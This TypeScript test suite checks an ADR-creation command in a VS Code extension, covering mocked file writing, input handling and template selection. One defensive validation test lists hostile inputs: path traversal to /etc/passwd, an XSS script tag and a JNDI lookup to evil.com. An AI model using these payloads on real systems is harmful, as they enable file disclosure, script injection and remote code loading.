import * as assert from 'assert';
import * as vscode from 'vscode';
import { createAdr, FileWriter } from '../../command-create';
import { SecurityValidator } from '../../security-validator';

/**
 * Mock FileWriter pour les tests
 */
class MockFileWriter implements FileWriter {
	public writeFileCalled = false;
	public writeFileUri: vscode.Uri | null = null;
	public writeFileContent: Buffer | null = null;
	public shouldThrowError = false;
	public errorMessage = 'Erreur de test';

	async writeFile(uri: vscode.Uri, content: Buffer): Promise<void> {
		this.writeFileCalled = true;
		this.writeFileUri = uri;
		this.writeFileContent = content;
		
		if (this.shouldThrowError) {
			throw new Error(this.errorMessage);
		}
	}
}

suite('Command-Create Test Suite', () => {
	vscode.window.showInformationMessage('Start all create tests.');

	test('createAdr should handle null URI gracefully', async () => {
		// Mock de showOpenDialog pour retourner null
		const originalShowOpenDialog = vscode.window.showOpenDialog;
		vscode.window.showOpenDialog = function() {
			return Promise.resolve(undefined);
		} as any;

		try {
			// Devrait gérer l'erreur sans planter
			await createAdr(null as any);
			// Si on arrive ici, la fonction a géré l'erreur correctement
			assert(true);
		} catch (error) {
			// L'erreur est attendue et gérée par la fonction
			assert(error instanceof Error);
		} finally {
			// Restaure la fonction originale
			vscode.window.showOpenDialog = originalShowOpenDialog;
		}
	});

	test('createAdr should handle file write error', async () => {
		const mockFileWriter = new MockFileWriter();
		mockFileWriter.shouldThrowError = true;
		mockFileWriter.errorMessage = 'Erreur d\'écriture de fichier';

		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test ADR Title');
		} as any;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			assert.fail('Devrait lever une erreur lors de l\'écriture du fichier');
		} catch (error) {
			assert(error instanceof Error);
			// Vérifie seulement que l'erreur est bien gérée
			assert(mockFileWriter.writeFileCalled, 'Le mock devrait avoir été appelé');
		} finally {
			// Restaure la fonction originale
			vscode.window.showInputBox = originalShowInputBox;
		}
	});

	test('createAdr should handle null title input', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner null (utilisateur annule)
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve(null);
		} as any;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			// Si on arrive ici, la fonction a géré l'annulation correctement
			assert(!mockFileWriter.writeFileCalled, 'Le fichier ne devrait pas être écrit si le titre est null');
		} finally {
			// Restaure la fonction originale
			vscode.window.showInputBox = originalShowInputBox;
		}
	});

	test('createAdr should handle empty title input', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner une chaîne vide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('');
		} as any;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			// Si on arrive ici, la fonction a géré le titre vide correctement
			assert(!mockFileWriter.writeFileCalled, 'Le fichier ne devrait pas être écrit si le titre est vide');
		} finally {
			// Restaure la fonction originale
			vscode.window.showInputBox = originalShowInputBox;
		}
	});

	test('SecurityValidator integration should work correctly', () => {
		// Test d'intégration avec SecurityValidator
		assert.strictEqual(SecurityValidator.validateAdrTitle('Valid Title'), true);
		assert.strictEqual(SecurityValidator.validateAdrTitle(''), false);
		assert.strictEqual(SecurityValidator.validateAdrTitle('Invalid<>Title'), false);
	});

	test('Input validation should reject malicious input', () => {
		// Test de validation d'entrées malveillantes
		const maliciousInputs = [
			'../../../etc/passwd',
			'<script>alert("xss")</script>',
			'${jndi:ldap://evil.com/exploit}',
			'../../../../../../../../../../../../etc/passwd'
		];

		maliciousInputs.forEach(input => {
			assert.strictEqual(SecurityValidator.validateAdrTitle(input), false, 
				`L'entrée malveillante "${input}" devrait être rejetée`);
		});
	});

	test('FileWriter interface should work correctly', async () => {
		const mockFileWriter = new MockFileWriter();
		const testUri = vscode.Uri.file('test/file.md');
		const testContent = Buffer.from('test content');

		await mockFileWriter.writeFile(testUri, testContent);

		assert.strictEqual(mockFileWriter.writeFileCalled, true);
		assert.strictEqual(mockFileWriter.writeFileUri, testUri);
		assert.strictEqual(mockFileWriter.writeFileContent, testContent);
	});

	test('MADR template should be selected correctly', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test MADR ADR');
		} as any;

		// Mock de la configuration pour utiliser le template MADR
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function(section: string) {
			return {
				get: function(key: string, defaultValue?: any) {
					if (key === 'currentTemplate') {
						return 'madrTemplateEnglish';
					}
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as any;
		} as any;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileContent, 'Le contenu devrait être écrit');
			
			// Vérifier que le contenu contient les éléments spécifiques au template MADR
			const content = mockFileWriter.writeFileContent!.toString();
			assert(content.includes('---'), 'Le template MADR devrait contenir des métadonnées YAML');
			assert(content.includes('title:'), 'Le template MADR devrait contenir le champ title');
			assert(content.includes('status:'), 'Le template MADR devrait contenir le champ status');
			assert(content.includes('decision-makers:'), 'Le template MADR devrait contenir le champ decision-makers');
			assert(content.includes('## Context and Problem Statement'), 'Le template MADR devrait contenir la section Context and Problem Statement');
			assert(content.includes('## Decision Drivers'), 'Le template MADR devrait contenir la section Decision Drivers');
			assert(content.includes('## Considered Options'), 'Le template MADR devrait contenir la section Considered Options');
			assert(content.includes('## Decision Outcome'), 'Le template MADR devrait contenir la section Decision Outcome');
			assert(content.includes('## Pros and Cons of the Options'), 'Le template MADR devrait contenir la section Pros and Cons of the Options');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Template selection should handle unknown template gracefully', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Unknown Template');
		} as any;

		// Mock de la configuration pour utiliser un template inconnu
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function(section: string) {
			return {
				get: function(key: string, defaultValue?: any) {
					if (key === 'currentTemplate') {
						return 'unknownTemplate';
					}
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as any;
		} as any;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit même avec un template inconnu');
			assert(mockFileWriter.writeFileContent, 'Le contenu devrait être écrit');
			
			// Vérifier que le contenu contient les éléments du template français par défaut (fallback)
			const content = mockFileWriter.writeFileContent!.toString();
			assert(content.includes('* **Statut**'), 'Le fallback devrait utiliser le template français');
			assert(content.includes('## Contexte et Problématique'), 'Le fallback devrait contenir la section Contexte');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Template selection should use centralized mapping for all templates', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Template Mapping');
		} as any;

		// Test tous les templates disponibles
		const templates = [
			'defaultTemplateFrench',
			'defaultTemplateEnglish', 
			'madrTemplateEnglish',
			'madrTemplateFrench'
		];

		for (const templateName of templates) {
			// Mock de la configuration pour utiliser le template en cours de test
			const originalGetConfiguration = vscode.workspace.getConfiguration;
			vscode.workspace.getConfiguration = function(section: string) {
				return {
					get: function(key: string, defaultValue?: any) {
						if (key === 'currentTemplate') {
							return templateName;
						}
						if (key === 'adrFilePrefix') {
							return 'adr_';
						}
						if (key === 'adrDirectoryName') {
							return 'adr';
						}
						return defaultValue;
					}
				} as any;
			} as any;

			try {
				const testUri = vscode.Uri.file('test/path/adr');
				await createAdr(testUri, mockFileWriter);
				
				assert(mockFileWriter.writeFileCalled, `Le fichier devrait être écrit avec le template ${templateName}`);
				assert(mockFileWriter.writeFileContent, `Le contenu devrait être écrit avec le template ${templateName}`);
				
				// Vérifier que le bon template a été sélectionné selon le type
				const content = mockFileWriter.writeFileContent!.toString();
				
				if (templateName.includes('madr')) {
					// Templates MADR
					assert(content.includes('---'), `Le template ${templateName} devrait contenir des métadonnées YAML`);
					assert(content.includes('title:'), `Le template ${templateName} devrait contenir le champ title`);
					assert(content.includes('status:'), `Le template ${templateName} devrait contenir le champ status`);
				} else {
					// Templates par défaut
					assert(content.includes('* **'), `Le template ${templateName} devrait contenir des métadonnées en format liste`);
					assert(content.includes('## '), `Le template ${templateName} devrait contenir des sections`);
				}
				
				// Reset pour le prochain test
				mockFileWriter.writeFileCalled = false;
				mockFileWriter.writeFileContent = null;
				
			} finally {
				// Restaure la fonction originale
				vscode.workspace.getConfiguration = originalGetConfiguration;
			}
		}
		
		// Restaure la fonction originale
		vscode.window.showInputBox = originalShowInputBox;
	});

	test('Should warn user if template is unknown and fallback to default', async () => {
		const mockFileWriter = new MockFileWriter();
		let warningMessage = '';

		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Unknown Template');
		} as any;

		// Mock de showWarningMessage pour capturer le message
		const originalShowWarningMessage = vscode.window.showWarningMessage;
		vscode.window.showWarningMessage = function(msg: string) {
			warningMessage = msg;
			return Promise.resolve('OK');
		} as any;

		// Mock de la configuration pour utiliser un template inconnu
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function(section: string) {
			return {
				get: function(key: string, defaultValue?: any) {
					if (key === 'currentTemplate') {
						return 'unknownTemplate';
					}
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as any;
		} as any;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit même avec un template inconnu');
			assert(mockFileWriter.writeFileContent, 'Le contenu devrait être écrit');
			assert(warningMessage.includes('inconnu'), 'Un message d\'avertissement doit être affiché si le template est inconnu');
			const content = mockFileWriter.writeFileContent!.toString();
			assert(content.includes('* **Statut**'), 'Le fallback doit utiliser le template français par défaut');
		} finally {
			vscode.window.showInputBox = originalShowInputBox;
			vscode.window.showWarningMessage = originalShowWarningMessage;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should use custom template file if customTemplatePath is set', async () => {
		const mockFileWriter = new MockFileWriter();
		const customTemplateContent = 'CUSTOM TEMPLATE CONTENT';
		let fileReadPath = '';

		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Custom Template');
		} as any;

		// Mock de la configuration pour utiliser un chemin personnalisé
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function(section: string) {
			return {
				get: function(key: string, defaultValue?: any) {
					if (key === 'currentTemplate') {
						return 'defaultTemplateFrench'; // peu importe, custom doit primer
					}
					if (key === 'customTemplatePath') {
						return '/tmp/custom-template.md';
					}
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as any;
		} as any;

		// Mock de la lecture de fichier (fs)
		const originalReadFile = require('fs').readFileSync;
		require('fs').readFileSync = function(path: string) {
			fileReadPath = path;
			return customTemplateContent;
		};

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit avec le template personnalisé');
			assert.strictEqual(fileReadPath, '/tmp/custom-template.md', 'Le chemin du template personnalisé doit être utilisé');
			const content = mockFileWriter.writeFileContent!.toString();
			assert.strictEqual(content, customTemplateContent, 'Le contenu du template personnalisé doit être utilisé');
		} finally {
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
			require('fs').readFileSync = originalReadFile;
		}
	});
}); 